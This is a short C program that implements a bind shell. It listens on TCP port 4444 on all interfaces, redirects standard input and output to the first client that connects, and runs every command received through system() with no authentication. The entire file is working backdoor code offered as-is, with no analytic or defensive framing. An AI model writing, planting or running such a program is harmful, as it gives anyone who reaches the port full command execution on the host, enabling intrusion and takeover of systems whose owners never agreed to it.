#include <sys/socket.h>
#include <netinet/ip.h>
#include <stdio.h>

int main() {
    int server_socket_fd, client_socket_fd, bytes_read, size_client_socket_struct, i;
    struct sockaddr_in server_address, client_address;
    char client_command[1024] = {0};

    char *const parmList[] = {"/bin/sh", "-c", client_command, NULL};
    char *const envParms[] = {NULL};

    // create a TCP socket
    server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(4444);

    // bind the socket to 0.0.0.0:4444
    if (bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address)) < 0) {
        return 10;
    }

    // passive socket that listens for connections
    listen(server_socket_fd, 1);

    // accept incoming connection
    size_client_socket_struct = sizeof(struct sockaddr_in);
    client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);

    dup2(client_socket_fd, 0);
    dup2(client_socket_fd, 1);
    dup2(client_socket_fd, 2);

    // receive data from client (max 1024 bytes)
    while ((bytes_read = recv(client_socket_fd, &client_command, 1024, 0)) > 0) {
        // execute client command
        system(client_command);
        memset(client_command, 0, sizeof(client_command));
    }

    close(server_socket_fd);
}
